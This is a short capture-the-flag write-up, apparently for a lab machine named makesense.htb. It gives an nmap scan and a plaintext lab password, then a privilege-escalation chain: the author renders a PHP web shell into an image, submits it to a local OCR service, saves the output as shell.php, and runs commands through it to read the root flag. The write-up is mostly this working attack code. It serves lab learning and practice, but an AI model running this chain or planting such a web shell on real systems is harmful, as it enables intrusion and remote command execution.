```Shell
nmap -sSVC -A 10.129.23.220    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-05 02:01 +07
Nmap scan report for 10.129.23.220
Host is up (0.36s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
80/tcp   filtered http
443/tcp  open     ssl/http    Apache httpd 2.4.58 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: 400 Bad Request
|_http-trane-info: Problem with XML parsing of /evox/about
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=makesense.htb
| Not valid before: 2026-05-29T16:37:29
|_Not valid after:  2126-05-05T16:37:29
8001/tcp filtered vcom-tunnel
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   359.12 ms 10.10.14.1
2   359.40 ms 10.129.23.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.36 seconds

```

Found https://makesense.htb/wp-content/uploads. The login credentials `walter:JbhHDAEgXvri3!` were found in one of the voice recordings.
# Root

```Bash
# 1. Create HTML for rendering
cat > /tmp/shell.html << 'EOF'
<html><body style="margin:0;background:white;">
<div style="font-family:'Liberation Mono',monospace;font-size:60px;padding:30px;white-space:nowrap;">
&lt;?php system($_GET['c']); ?&gt;
</div>
</body></html>
EOF

# 2. Generate PNG using headless Chrome
/opt/google/chrome/chrome --headless --disable-gpu --no-sandbox \\
  --screenshot=/tmp/shell.png --window-size=1400,200 "file:///tmp/shell.html"

ls -la /tmp/shell.png
```

```Shell
# 3. Preparation
rm -f /tmp/cookies.txt

# 4. Recognize (send the image)
curl -s -u walter:'JbhHDAEgXvri3!' -c /tmp/cookies.txt -b /tmp/cookies.txt \\
  http://127.0.0.1:8001/ \\
  --data-urlencode "canvas_image=data:image/png;base64,$(base64 -w0 /tmp/shell.png)" \\
  -o /tmp/response.html

cat /tmp/response.html | head -30
OCR_ID=$(grep -oP 'ocr_id" value="\\K[^"]+' /tmp/response.html)
echo "OCR_ID: $OCR_ID"
```

```Shell
# 5. Save as shell.php
curl -s -u walter:'JbhHDAEgXvri3!' -c /tmp/cookies.txt -b /tmp/cookies.txt \\
  http://127.0.0.1:8001/ \\
  --data-urlencode "ocr_id=${OCR_ID}" \\
  --data-urlencode "filename=shell.php" \\
  --data-urlencode "save_output=Save" \\
  -o /tmp/save_response.html

cat /tmp/save_response.html
```
`
```Shell
# 6. Check the shell
curl -s -u walter:'JbhHDAEgXvri3!' "http://127.0.0.1:8001/saved/shell.php?c=id"
```

```Shell
curl -s -u walter:'JbhHDAEgXvri3!' "http://127.0.0.1:8001/saved/shell.php?c=cat+/root/root.txt"
```
